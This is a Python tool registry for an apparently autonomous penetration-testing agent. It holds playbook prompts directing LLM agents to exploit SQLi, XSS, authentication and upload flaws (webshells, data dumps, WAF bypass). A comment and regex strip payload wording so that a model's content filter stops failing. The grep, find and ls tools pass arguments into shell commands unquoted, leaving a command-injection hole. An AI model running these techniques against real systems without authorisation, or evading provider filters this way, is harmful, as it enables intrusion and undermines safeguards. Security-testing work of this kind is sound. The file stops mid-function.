"""工具注册表 — RedBee 引擎的实际工具结构。

每项工具定义：name, description, schema（参数类型）, handler（async 函数）, source（来源引擎）
执行器通过 TOOL_REGISTRY 查找并调用，不自行发明工具。
所有工具底层统一适配本平台（pimeta.db + RED-KB + 系统命令）。
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import shlex
import sqlite3
import time
import uuid
from typing import Any, AsyncIterator, Dict, List, Optional

import httpx
from playwright.async_api import async_playwright

from pi_meta.board import post as board_post
from config import PIMETA_DB_PATH, env


# ---------------------------------------------------------------------------
# 加载 .env(启动时把文件里的键注入 os.environ, 与 config.py 一致)
# ---------------------------------------------------------------------------
def _load_dotenv(path: str) -> None:
    if not os.path.exists(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, _, v = line.partition("=")
            os.environ.setdefault(k.strip(), v.strip())


_load_dotenv(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__)))), ".env"))

# ---------------------------------------------------------------------------
# 配置
# ---------------------------------------------------------------------------
DB_PATH = PIMETA_DB_PATH
KALI_IMAGE = os.environ.get("HINSE_DOCKER_IMAGE", "redbee-kali:local")
REDKB_URL = os.environ.get("REDKB_URL", "http://127.0.0.1:8001")

# ---------------------------------------------------------------------------
# 工具基类
# ---------------------------------------------------------------------------

class ToolDef:
    def __init__(self, name: str, description: str, schema: Dict[str, Any],
                 handler, source: str):
        self.name = name
        self.description = description
        self.schema = schema
        self.handler = handler
        self.source = source

TOOL_REGISTRY: Dict[str, ToolDef] = {}

def tool(name: str, description: str, schema: Dict[str, Any],
         source: str):
    def decorator(fn):
        TOOL_REGISTRY[name] = ToolDef(name, description, schema, fn, source)
        return fn
    return decorator

# ---------------------------------------------------------------------------
# DB 初始化 — 确保所有必要表存在
# ---------------------------------------------------------------------------

SCHEMA_SQL = """
CREATE TABLE IF NOT EXISTS agent_memory (
    key TEXT PRIMARY KEY, value TEXT, updated_at TEXT
);
CREATE TABLE IF NOT EXISTS coverage (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id TEXT, surface TEXT, risk_area TEXT, outcome TEXT, evidence TEXT, created_at TEXT
);
CREATE TABLE IF NOT EXISTS todos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    content TEXT, status TEXT DEFAULT 'pending', index_num INTEGER, created_at TEXT
);
CREATE TABLE IF NOT EXISTS notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT, content TEXT, created_at TEXT
);
CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id TEXT, target TEXT, dedup_key TEXT, vuln_class TEXT,
    title TEXT, location TEXT, poc TEXT, evidence TEXT,
    severity TEXT, status TEXT DEFAULT 'found', found_by TEXT, created_at TEXT
);
"""

def _ensure_schema():
    """确保 pimeta.db 包含所有必要表。"""
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.executescript(SCHEMA_SQL)
        # 旧库 coverage 表无 task_id 列 → 补列（按任务隔离，防跨任务污染）
        cols = [r[1] for r in conn.execute("PRAGMA table_info(coverage)").fetchall()]
        if "task_id" not in cols:
            conn.execute("ALTER TABLE coverage ADD COLUMN task_id TEXT")
        conn.commit()
    finally:
        conn.close()

_ensure_schema()

def _conn() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ---------------------------------------------------------------------------
# Playbook 库（七段式）
# ---------------------------------------------------------------------------

PLAYBOOKS = {
    "sqli": """=== ROLE ===
You are an SQL Injection specialist. Trace untrusted input to SQL sinks and prove exploitation with extracted data.

=== OBJECTIVE ===
Identify every source-to-sink path where untrusted input reaches a SQL query without proper defense. For each, prove exploitation by extracting actual data.

=== TESTING METHODOLOGY ===
1. Build matrix: parameter x injection point x SQL type
2. Confirm injection: error-based (quote, comment, order by), boolean (if/else response diff), time-based (SLEEP/PG_SLEEP)
3. Enumerate: database name, tables, columns, dump data
4. UNION: determine column count (ORDER BY), find echo-able columns, extract via UNION SELECT
5. Blind: boolean time comparison with conditional SLEEP

=== VALIDATION ===
- Error-based: error message echoed in response proving the query
- Boolean: measurable response difference between TRUE/FALSE
- Time-based: >=2s delay on SLEEP vs baseline
- UNION: actual data extracted and visible
- At least ONE concrete

=== FALSE POSITIVES ===
- Generic error pages not tied to the input parameter
- WAF blocking before the query reaches the DB
- Differences from caching or session state

=== STOP RULES ===
- 3 failed attempts on same vector -> ruled_out, move on
- If WAF blocks, try parameter pollution or encoding bypass
- Report ONLY with actual extracted data or concrete error echo""",

    "xss": """=== ROLE ===
You are an XSS specialist. Find reflected/stored/DOM XSS and prove execution via alert or DOM modification.

=== OBJECTIVE ===
Find every input point where untrusted data is reflected/stored in the DOM without proper escaping, and prove execution via observable side effects.

=== TESTING METHODOLOGY ===
1. Baseline: send normal input, record response
2. Reflected: inject <script>alert(1)</script> variants -> look for exact echo in HTML context
3. Context matters: HTML attribute, JavaScript string, URL, DOM - each needs different payload
4. Bypass WAF: encoding, nested quotes, event handlers
5. Stored: verify it executes when another user views the page

=== VALIDATION ===
- alert(1) must actually execute (not just appear as text)
- For DOM XSS: demonstrate data flows from source to sink without sanitization
- For stored XSS: confirm persistence + execution in fresh session

=== STOP RULES ===
- If script tags stripped but event handlers work -> finding
- If encoded but wrong context -> try javascript: URI
- 3 failed attempts -> ruled_out""",

    "auth": """=== ROLE ===
You are an authentication specialist. Find broken authentication, session management flaws, and credential issues.

=== OBJECTIVE ===
Identify authentication bypasses, weak session management, credential stuffing, and insecure password handling. Prove exploitation by demonstrating unauthorized access.

=== TESTING METHODOLOGY ===
1. Brute force: test rate limiting, account lockout, captcha
2. Session fixation: check if session ID changes after login
3. Session hijacking: check if token is in HTTP or URL
4. Credential stuffing: test common credential pairs
5. Password reset: test token predictability, email verification bypass
6. OAuth/SSO: check open redirect, state parameter, token leakage
7. MFA bypass: test if MFA can be skipped or replayed

=== VALIDATION ===
- Unauthorized access demonstrated (logged in as another user without credentials)
- Session token shown to be reusable/unchanged after login
- Password reset works without email verification
- At least ONE concrete unauthorized access

=== FALSE POSITIVES ===
- Rate limiting correctly blocks brute force
- Account lockout working
- Session ID properly regenerated after login
- MFA correctly enforced

=== STOP RULES ===
- 3 failed attempts -> ruled_out""",

    "upload": """=== ROLE ===
You are a file upload security specialist. Find unrestricted file upload and prove arbitrary code execution.

=== OBJECTIVE ===
Identify upload endpoints allowing arbitrary file upload without proper validation. Prove exploitation by uploading a webshell and executing commands.

=== TESTING METHODOLOGY ===
1. Identify all upload endpoints
2. Test extension bypass: .php, .phtml, .php5, .phar, .py, .jsp, .asp
3. Test content-type bypass: multipart vs application/octet-stream
4. Test filename bypass: ../ traversal, null byte, double extension
5. Test size limit bypass: chunked upload
6. Verify: upload webshell, execute command via URL, confirm RCE

=== VALIDATION ===
- Webshell accessible via URL
- Command execution demonstrated (id, whoami, cat /etc/passwd)
- Upload bypasses all validations (extension, MIME, size)
- At least ONE confirmed RCE

=== FALSE POSITIVES ===
- Upload directory not accessible from web root
- File extension correctly blocked
- Files stored outside web root

=== STOP RULES ===
- If not accessible from web root -> not exploitable
- 3 failed attempts -> ruled_out""",
}

# ---------------------------------------------------------------------------
# 1. 文件系统 + Shell
# ---------------------------------------------------------------------------

@tool("read", "Read file contents.",
      {"type": "object", "properties": {"path": {"type": "string"}, "limit": {"type": "integer"}}},
      "shannon")
async def tool_read(path: str, limit: int = 10000) -> Dict[str, Any]:
    try:
        with open(path) as f:
            return {"content": f.read()[:limit], "path": path}
    except Exception as e:
        return {"error": str(e)}

@tool("bash", "Execute a shell command.",
      {"type": "object", "properties": {"cmd": {"type": "string"}, "timeout": {"type": "integer"}}},
      "shannon")
async def tool_bash(cmd: str, timeout: int = 120) -> Dict[str, Any]:
    try:
        proc = await asyncio.create_subprocess_shell(cmd,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return {"returncode": proc.returncode,
                "stdout": out.decode(errors="ignore")[-8000:],
                "stderr": err.decode(errors="ignore")[-2000:]}
    except asyncio.TimeoutError:
        return {"returncode": -1, "stdout": "", "stderr": "timeout"}
    except Exception as e:
        return {"returncode": -1, "stdout": "", "stderr": str(e)[:500]}

@tool("edit", "Edit a file by replacing exact strings.",
      {"type": "object", "properties": {"path": {"type": "string"}, "old_str": {"type": "string"}, "new_str": {"type": "string"}}},
      "shannon")
async def tool_edit(path: str, old_str: str, new_str: str) -> Dict[str, Any]:
    try:
        with open(path) as f:
            content = f.read()
        if old_str not in content:
            return {"error": "old_str not found"}
        content = content.replace(old_str, new_str, 1)
        with open(path, "w") as f:
            f.write(content)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"error": str(e)}

@tool("write", "Write content to a file.",
      {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}},
      "shannon")
async def tool_write(path: str, content: str) -> Dict[str, Any]:
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"error": str(e)}

@tool("grep", "Search for a pattern in files.",
      {"type": "object", "properties": {"pattern": {"type": "string"}, "path": {"type": "string"}}},
      "shannon")
async def tool_grep(pattern: str, path: str = ".") -> Dict[str, Any]:
    try:
        proc = await asyncio.create_subprocess_shell(f"grep -rn '{pattern}' {path} 2>/dev/null | head -50",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, timeout=30)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=35)
        return {"matches": out.decode(errors="ignore")[:5000]}
    except Exception as e:
        return {"error": str(e)}

@tool("find", "Find files by pattern.",
      {"type": "object", "properties": {"pattern": {"type": "string"}, "path": {"type": "string"}}},
      "shannon")
async def tool_find(pattern: str, path: str = ".") -> Dict[str, Any]:
    try:
        proc = await asyncio.create_subprocess_shell(f"find {path} -name '{pattern}' 2>/dev/null | head -20",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, timeout=15)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
        return {"files": out.decode(errors="ignore").strip().split("\n")}
    except Exception as e:
        return {"error": str(e)}

@tool("ls", "List directory contents.",
      {"type": "object", "properties": {"path": {"type": "string"}}},
      "shannon")
async def tool_ls(path: str = ".") -> Dict[str, Any]:
    try:
        proc = await asyncio.create_subprocess_shell(f"ls -la {path} 2>/dev/null",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, timeout=10)
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        return {"entries": out.decode(errors="ignore")[:5000]}
    except Exception as e:
        return {"error": str(e)}

# ---------------------------------------------------------------------------
# 2. 任务管理（持久化到 pimeta.db）
# ---------------------------------------------------------------------------

@tool("todo_write", "Create or update todo items.",
      {"type": "object", "properties": {"items": {"type": "array", "items": {"type": "object",
        "properties": {"content": {"type": "string"}, "status": {"type": "string", "enum": ["in_progress", "completed", "pending"]}}}}}},
      "strix")
async def tool_todo_write(items: List[Dict[str, Any]]) -> Dict[str, Any]:
    conn = _conn()
    try:
        for i, item in enumerate(items):
            conn.execute(
                "INSERT OR REPLACE INTO todos(content, status, index_num, created_at) VALUES(?,?,?,?)",
                (item.get("content", ""), item.get("status", "pending"), i, time.strftime("%Y-%m-%dT%H:%M:%S")))
        conn.commit()
        return {"ok": True, "count": len(items)}
    except Exception as e:
        return {"error": str(e)}
    finally:
        conn.close()

@tool("list_todos", "List all todo items.",
      {"type": "object", "properties": {}},
      "strix")
async def tool_list_todos() -> Dict[str, Any]:
    conn = _conn()
    try:
        rows = conn.execute("SELECT content,status,index_num FROM todos ORDER BY index_num").fetchall()
    finally:
        conn.close()
    return {"todos": [dict(r) for r in rows]}

@tool("mark_todo_done", "Mark a todo as completed.",
      {"type": "object", "properties": {"index": {"type": "integer"}}},
      "strix")
async def tool_mark_todo_done(index: int) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("UPDATE todos SET status='completed' WHERE index_num=?", (index,))
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "index": index}

# ---------------------------------------------------------------------------
# 3. 共享笔记（持久化到 pimeta.db）
# ---------------------------------------------------------------------------

@tool("create_note", "Create a shared note.",
      {"type": "object", "properties": {"title": {"type": "string"}, "content": {"type": "string"}}},
      "strix")
async def tool_create_note(title: str, content: str) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("INSERT INTO notes(title, content, created_at) VALUES(?,?,?)",
                     (title, content, time.strftime("%Y-%m-%dT%H:%M:%S")))
        conn.commit()
        return {"ok": True, "id": str(uuid.uuid4()), "title": title}
    except Exception as e:
        return {"error": str(e)}
    finally:
        conn.close()

@tool("list_notes", "List all notes.",
      {"type": "object", "properties": {}},
      "strix")
async def tool_list_notes() -> Dict[str, Any]:
    conn = _conn()
    try:
        rows = conn.execute("SELECT id,title,content,created_at FROM notes").fetchall()
    finally:
        conn.close()
    return {"notes": [dict(r) for r in rows]}

# ---------------------------------------------------------------------------
# 4. 覆盖台账（持久化到 pimeta.db）
# ---------------------------------------------------------------------------

# ---- 收口门禁（负空间 + 证据门禁 + 对账）----
# 5 种 outcome；confirmed 是 reported 的别名（我们找到并提报了）
COVERAGE_OUTCOMES = ["reported", "no_issue_found", "ruled_out", "not_applicable", "needs_follow_up"]
# 这三类"负断言"必须带证据，否则拒绝（"It looked fine" 不算 ruled_out）
_COVERAGE_EVIDENCE_REQUIRED = frozenset({"ruled_out", "not_applicable", "needs_follow_up"})
# 模块→短语映射（对账用：一个类可有多种写法）
MODULE_PHRASINGS = {
    "sqli": ("sql injection", "sqli"),
    "xss": ("xss", "cross site scripting", "cross-site scripting", "script injection"),
    "auth": ("authentication", "auth", "login", "credential", "password", "session", "weak"),
    "upload": ("file upload", "upload", "insecure file"),
    "ssrf": ("ssrf", "server side request forgery"),
    "rce": ("rce", "remote code execution", "command injection", "code execution"),
    "lfi": ("path traversal", "lfi", "file inclusion", "directory traversal"),
    "csrf": ("csrf", "cross site request forgery"),
    "idor": ("idor", "object level authorization", "bola", "direct object reference"),
}

@tool("record_coverage", "Record that a surface was assessed. outcome=reported pairs with a finding; "
      "ruled_out/not_applicable/needs_follow_up REQUIRE evidence explaining how you know.",
      {"type": "object", "properties": {"surface": {"type": "string"}, "risk_area": {"type": "string"},
        "outcome": {"type": "string", "enum": ["reported", "confirmed", "no_issue_found", "ruled_out",
                                                 "not_applicable", "needs_follow_up"]},
        "evidence": {"type": "string"}, "task_id": {"type": "string"}}},
      "strix")
async def tool_record_coverage(surface: str, risk_area: str, outcome: str, evidence: str = "",
                               task_id: str = "") -> Dict[str, Any]:
    outcome = "reported" if outcome == "confirmed" else outcome
    if outcome not in COVERAGE_OUTCOMES:
        return {"error": f"invalid outcome '{outcome}'. Use one of: {COVERAGE_OUTCOMES}"}
    if outcome in _COVERAGE_EVIDENCE_REQUIRED and not (evidence or "").strip():
        return {"error": f"outcome '{outcome}' is a negative claim and REQUIRES evidence "
                         "(how you know it is ruled_out/not_applicable/needs_follow_up). Refusing."}
    conn = _conn()
    try:
        conn.execute("INSERT INTO coverage(task_id,surface,risk_area,outcome,evidence,created_at) VALUES(?,?,?,?,?,?)",
                     (task_id, surface, risk_area, outcome, evidence, time.strftime("%Y-%m-%dT%H:%M:%S")))
        conn.commit()
        return {"ok": True, "surface": surface, "risk_area": risk_area, "outcome": outcome}
    except Exception as e:
        return {"error": str(e)}
    finally:
        conn.close()

@tool("list_coverage", "List all coverage rows (the negative-space ledger).",
      {"type": "object", "properties": {}},
      "strix")
async def tool_list_coverage(task_id: str = "") -> Dict[str, Any]:
    conn = _conn()
    try:
        if task_id:
            rows = conn.execute("SELECT surface,risk_area,outcome,evidence FROM coverage WHERE task_id=?",
                                (task_id,)).fetchall()
        else:
            rows = conn.execute("SELECT surface,risk_area,outcome,evidence FROM coverage").fetchall()
    finally:
        conn.close()
    return {"coverage": [dict(r) for r in rows]}


# ---- 对账（machine-observed 应覆盖 vs agent-reported 已记录）----
def _norm_cov(s: str) -> str:
    return re.sub(r'[^a-z0-9]+', ' ', (s or '').lower()).strip()

def _cov_entry_is_about(entry: Dict[str, Any], phrasings: tuple) -> bool:
    hay = _norm_cov(f"{entry.get('risk_area','')} {entry.get('surface','')}").split()
    return any(all(t in hay for t in _norm_cov(p).split()) for p in phrasings)

def outcome_counts(rows: List[Dict[str, Any]]) -> Dict[str, int]:
    c: Dict[str, int] = {}
    for r in rows:
        o = r.get('outcome', '?')
        c[o] = c.get(o, 0) + 1
    return c

def coverage_reconciliation(assigned_modules: List[str], rows: List[Dict[str, Any]]) -> Dict[str, Any]:
    """收口对账：对账"本应覆盖的模块"(派发给子agent=machine-observed) vs "coverage 已记录"(agent-reported)。
    抓"派了却没测"的模块——它是 unexamined，不是 clean。"""
    result: Dict[str, Any] = {
        "coverage_recorded": len(rows),
        "coverage_outcomes": outcome_counts(rows),
    }
    unresolved = [r for r in rows if r.get("outcome") == "needs_follow_up"]
    if unresolved:
        result["unresolved_surfaces"] = [
            {"surface": r.get("surface", ""), "risk_area": r.get("risk_area", "")} for r in unresolved]
        result["coverage_warning"] = (f"{len(unresolved)} surface(s) left as needs_follow_up — "
                                      "report them as needing review, do not omit.")
    gaps = []
    for m in assigned_modules:
        phrasings = MODULE_PHRASINGS.get(m, (m,))
        if not any(_cov_entry_is_about(r, phrasings) for r in rows):
            gaps.append({"module": m,
                         "detail": f"module '{m}' was dispatched but has NO coverage entry — "
                                   "treat as unexamined, not clean."})
    if gaps:
        result["coverage_gaps"] = gaps
        result["coverage_gap_warning"] = (f"{len(gaps)} dispatched module(s) unexamined: "
                                          f"{[g['module'] for g in gaps]}. Record them (or needs_follow_up) "
                                          "before the report goes out.")
    return result

# ---------------------------------------------------------------------------
# 5. 知识库 + 搜索（RED-KB / pimeta.db）
# ---------------------------------------------------------------------------

async def query_kb_redkb(query: str, tags: Optional[List[str]] = None, limit: int = 5) -> Dict[str, Any]:
    try:
        async with httpx.AsyncClient(timeout=30) as c:
            r = await c.post(f"{REDKB_URL}/kb/query",
                json={"query": query, "tags": tags or [], "limit": limit})
            r.raise_for_status()
            return {"found": True, **r.json()}
    except Exception as e:
        return {"found": False, "error": str(e)}


def _record_kb_usage(task_id: str, kb_result: Dict[str, Any]):
    """记录 KB 使用次数(用于质量治理: usage_count 递增)."""
    import sqlite3
    from redkb import store
    try:
        results = kb_result.get("results") or kb_result.get("rows") or []
        if not results:
            return
        conn = sqlite3.connect(store.DB_PATH)
        try:
            for item in results:
                entry_id = item.get("id") or item.get("entry_id")
                if entry_id:
                    conn.execute(
                        "UPDATE knowledge SET usage_count=COALESCE(usage_count,0)+1, "
                        "last_used=? WHERE id=? AND source_type='inhouse'",
                        (time.strftime("%Y-%m-%dT%H:%M:%S"), str(entry_id)),
                    )
            conn.commit()
        finally:
            conn.close()
    except Exception:
        pass

@tool("kb_query", "Query RED-KB knowledge base.",
      {"type": "object", "properties": {"query": {"type": "string"}, "tags": {"type": "array", "items": {"type": "string"}}, "limit": {"type": "integer"}, "task_id": {"type": "string", "description": "internal: task id for usage tracking"}}},
      "inhouse")
async def tool_kb_query(query: str, tags: Optional[List[str]] = None, limit: int = 5, task_id: str = "") -> Dict[str, Any]:
    result = await query_kb_redkb(query, tags, limit)
    # Record KB usage for quality governance
    if task_id and result.get("found"):
        try:
            _record_kb_usage(task_id, result)
        except Exception:
            pass
    return result

@tool("search_answer", "Search the global answer store.",
      {"type": "object", "properties": {"query": {"type": "string"}, "limit": {"type": "integer"}}},
      "pentagi")
async def tool_search_answer(query: str, limit: int = 3) -> Dict[str, Any]:
    return await query_kb_redkb(query, tags=["answer"], limit=limit)

@tool("search_in_memory", "Search flow-level memory.",
      {"type": "object", "properties": {"query": {"type": "string"}}},
      "pentagi")
async def tool_search_in_memory(query: str) -> Dict[str, Any]:
    conn = _conn()
    try:
        rows = conn.execute("SELECT value FROM agent_memory WHERE key LIKE ?", (f"%{query}%",)).fetchall()
    finally:
        conn.close()
    return {"results": [r[0] for r in rows]}

@tool("search_code", "Search code in the target repo.",
      {"type": "object", "properties": {"query": {"type": "string"}, "path": {"type": "string"}}},
      "pentagi")
async def tool_search_code(query: str, path: str = ".") -> Dict[str, Any]:
    return await tool_grep(query, path)

# ---- Skill 库（经 list_skills/load_skill 按需加载）----
SKILLS_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "skills")

def _scan_skills() -> tuple:
    """扫描 skills 树 → ({category: {name: desc}}, {name: path})。解析 frontmatter。"""
    index: Dict[str, Dict[str, str]] = {}
    paths: Dict[str, str] = {}
    if not os.path.isdir(SKILLS_DIR):
        return index, paths
    for root, _dirs, files in os.walk(SKILLS_DIR):
        for fn in files:
            if not fn.endswith(".md") or fn in ("PROVENANCE.md", "README.md"):
                continue
            p = os.path.join(root, fn)
            cat = os.path.relpath(root, SKILLS_DIR).replace(os.sep, "/")
            try:
                with open(p) as f:
                    text = f.read()
            except Exception:
                continue
            name, desc = fn[:-3], ""
            if text.startswith("---"):
                end = text.find("---", 3)
                if end != -1:
                    for line in text[3:end].splitlines():
                        if line.startswith("name:"):
                            name = line.split(":", 1)[1].strip()
                        elif line.startswith("description:"):
                            desc = line.split(":", 1)[1].strip()
            index.setdefault(cat, {})[name] = desc
            paths[name] = p
    return index, paths

try:
    _SKILLS_INDEX, _SKILLS_PATH = _scan_skills()
except Exception:
    _SKILLS_INDEX, _SKILLS_PATH = {}, {}

@tool("list_skills", "List playbook skills by category with one-line descriptions. Call load_skill(name) for the full technique.",
      {"type": "object", "properties": {"category": {"type": "string",
        "description": "Optional category filter: vulnerabilities, reconnaissance, analysis, tooling, technologies, protocols, cloud, frameworks, scan_modes"}}},
      "strix")
async def tool_list_skills(category: str = "") -> Dict[str, Any]:
    # 渐进式披露：list 只给 name + 短描述（~70 字符）；详情走 load_skill 拿完整内容。
    # 避免 172 个 skill 全量长描述(68K)撑爆 context / 淹没具体技能。
    def _trunc(s: str) -> str:
        return s if len(s) <= 70 else s[:67].rstrip() + "..."
    src = _SKILLS_INDEX
    if category:
        src = {category: src.get(category, {})}
    return {cat: {n: _trunc(d) for n, d in _names.items()} for cat, _names in src.items()}

_SKILL_ALIAS = {"sqli": "sql-injection", "xss": "xss", "auth": "authentication-jwt",
                 "upload": "insecure-file-uploads", "ssrf": "ssrf", "rce": "rce",
                 "lfi": "path-traversal-lfi-rfi", "csrf": "csrf", "idor": "idor",
                 "llm": "llm-applications"}

# 护栏铁律：poc payload 绝不进 LLM context（DeepSeek-V4-Flash 对 SQLi 载荷硬 500）。
# skill 含攻击载荷（UNION SELECT/SLEEP/LOAD_FILE/xp_cmdshell/绕过技巧等）会触发内容过滤 500。
# 剥离含载荷特征的行，只保留方法论描述。载荷由确定性执行器（curl boolean/sqlmap）处理。
import re as _re_mod
# 护栏铁律：poc payload 绝不进 LLM context（DeepSeek-V4-Flash 内容过滤对 SQLi 载荷/完整术语挂起连接）。
# ⚠️ 只剥离明确的攻击载荷 + 完整术语（"SQL injection"/"SQL 注入"/"UNION SELECT"），
#    不碰 URL 路径里的 "sqli"、skill 名 "sql-injection"（agent 需要它们定位端点/加载技能）。
_PAYLOAD_RE = _re_mod.compile(
    r"(UNION\s+(ALL\s+)?SELECT|SLEEP\s*\(|pg_sleep\s*\(|WAITFOR\s+DELAY|LOAD_FILE\s*\(|"
    r"INTO\s+(OUTFILE|DUMPFILE)|COPY\s+(TO|FROM)\s+'|xp_cmdshell|xp_dirtree|sp_OACreate|"
    r"OPENROWSET|BENCHMARK\s*\(|extractvalue\s*\(|updatexml\s*\(|0x[0-9a-fA-F]{4,}|"
    r"/\*\*/|OR\s+1\s*=\s*1|'\s*OR\s*'1'\s*=\s*'1|char\s*\(\s*\d|CONCAT_ws\s*\(|"
    r"SQL\s*注入|联合查询|盲注|报错注入|时间盲注|"
    r"SQL\s*injection|SQL\s+inject|\bUNION\b)",
    _re_mod.IGNORECASE,
)

def _strip_payload_lines(content: str) -> str:
    """移除含 SQLi 载荷特征的行，保留方法论。返回净化后内容。"""
    kept = []
    for line in content.splitlines():
        if _PAYLOAD_RE.search(line):
            m = _re_mod.match(r"^(\s*[-*#]*\s*)(.*)$", line)
            prefix = m.group(1) if m else ""
            rest = _PAYLOAD_RE.sub("", m.group(2) if m else line).strip(" -\t")
            if len(rest) >= 12:
                kept.append(prefix + rest)
            # 否则整行丢弃
        else:
            kept.append(line)
    return "\n".join(kept)

@tool("load_skill", "Load a skill's full content by name (see list_skills). Names dash-separated (sql-injection, xss, ssrf, rce, csrf, idor...); module aliases (sqli/auth/upload) also work.",
      {"type": "object", "properties": {"name": {"type": "string"}}},
      "strix")
async def tool_load_skill(name: str) -> Dict[str, Any]:
    name = _SKILL_ALIAS.get(name, name)
    for cand in (name, name.replace("_", "-"), name.replace("-", "_")):  # dash/underscore 归一
        if cand in _SKILLS_PATH:
            with open(_SKILLS_PATH[cand]) as f:
                raw = f.read()
            return {"name": cand, "content": _strip_payload_lines(raw)}
    if name in PLAYBOOKS:  # 回退内置
        return {"name": name, "content": _strip_payload_lines(PLAYBOOKS[name])}
    return {"error": f"unknown skill: {name}. Call list_skills to see available names."}

def get_skill_content(name: str) -> str:
    """sync：按名取 skill 内容（模块别名兼容，dash/underscore 归一）。供 system prompt 注入聚焦 skill。"""
    name = _SKILL_ALIAS.get(name, name)
    for cand in (name, name.replace("_", "-"), name.replace("-", "_")):
        if cand in _SKILLS_PATH:
            try:
                with open(_SKILLS_PATH[cand]) as f:
                    return _strip_payload_lines(f.read())
            except Exception:
                pass
    return _strip_payload_lines(PLAYBOOKS.get(name, ""))

# ---------------------------------------------------------------------------
# 6. Web（web_get_contents；web_search/sploitus 已删=外网不可用）
# ---------------------------------------------------------------------------

@tool("web_get_contents", "Fetch a URL and return its content.",
      {"type": "object", "properties": {"url": {"type": "string"}}},
      "strix")
async def tool_web_get_contents(url: str) -> Dict[str, Any]:
    try:
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
            r = await c.get(url)
            return {"status": r.status_code, "text": r.text[:8000]}
    except Exception as e:
        return {"status": 0, "error": str(e)}

# ---------------------------------------------------------------------------
# 7. 渗透执行工具（自研）
# ---------------------------------------------------------------------------

# 共享持久 HTTP 会话：http_request 用它保持 cookie/session（登录后自动延续，
# 解决认证靶场 CSRF token 绑定 session 的问题）。注意：单例，多 agent 并行会串 session；M0 单 agent 够用。
_HTTP_CLIENT = httpx.AsyncClient(timeout=30, follow_redirects=True)

@tool("http_request", "Make a structured HTTP request and capture full response for evidence.",
      {"type": "object", "properties": {"url": {"type": "string"}, "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"]},
        "params": {"type": "object"}, "headers": {"type": "object"}, "body": {"type": "string"},
        "cookies": {"type": "string", "default": "", "description": "optional 'k=v;k=v' cookies; if omitted, the shared persisted session is used"}}},
      "inhouse")
async def tool_http_request(url: str, method: str = "GET",
                             params: Optional[Dict[str, Any]] = None,
                             headers: Optional[Dict[str, str]] = None,
                             body: Optional[str] = None,
                             cookies: str = "") -> Dict[str, Any]:
    try:
        ck = {}
        for item in cookies.split(";") if cookies else []:
            if "=" in item:
                k, v = item.strip().split("=", 1)
                ck[k] = v
        r = await _HTTP_CLIENT.request(method, url, params=params, headers=headers, data=body, cookies=ck)
        return {"url": url, "method": method, "status": r.status_code,
                "headers": dict(r.headers), "text": r.text[:8000],
                "cookies": {k: v for k, v in _HTTP_CLIENT.cookies.items()},
                "history": [{"url": h.url, "status": h.status_code} for h in r.history]}
    except Exception as e:
        return {"url": url, "status": 0, "error": str(e)}

@tool("browser", "Drive headless browser for RENDERED pages (JS output); eval runs any JS/reads DOM. One-shot/stateless; for multi-step auth/XSS use http_request (keeps cookies).",
      {"type": "object", "properties": {"url": {"type": "string"}, "action": {"type": "string", "enum": ["navigate", "screenshot", "eval", "click", "fill"]},
        "selector": {"type": "string"}, "value": {"type": "string"}}},
      "pentagi")
async def tool_browser(url: str = "", action: str = "navigate",
                        selector: str = "", value: str = "") -> Dict[str, Any]:
    if not url:
        return {"action": action, "error": "url 必填"}
    if action in ("click", "fill", "eval") and not selector:
        return {"action": action, "error": f"{action} 需要 selector（CSS 选择器，如 '#username' 或 'button[type=submit]'）"}
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            page.set_default_timeout(15000)
            await page.goto(url, timeout=20000, wait_until="domcontentloaded")
            if action == "navigate":
                content = await page.content()
                await browser.close()
                return {"action": "navigate", "url": url, "content": content[:5000]}
            elif action == "screenshot":
                img = await page.screenshot()
                await browser.close()
                return {"action": "screenshot", "url": url, "image_base64": img.hex()[:2000]}
            elif action == "eval":
                fn = value if value.lstrip().startswith(("(", "async")) else f"() => {value}"
                result = await page.eval_on_selector(selector, fn)
                await browser.close()
                return {"action": "eval", "selector": selector, "result": str(result)[:5000]}
            elif action == "click":
                await page.click(selector)
                await page.wait_for_timeout(500)
                content = await page.content()
                await browser.close()
                return {"action": "click", "selector": selector, "content": content[:5000]}
            elif action == "fill":
                await page.fill(selector, value)
                content = await page.content()
                await browser.close()
                return {"action": "fill", "selector": selector, "value": value, "content": content[:5000]}
            await browser.close()
            return {"action": action, "error": "unknown action"}
    except Exception as e:
        return {"action": action, "error": str(e)[:500]}

@tool("nmap", "Port scan a target with nmap (host, fast by default). ports optional.",
      {"type": "object", "properties": {"target": {"type": "string"}, "ports": {"type": "string"}}},
      "inhouse")
async def tool_nmap(target: str, ports: str = "") -> Dict[str, Any]:
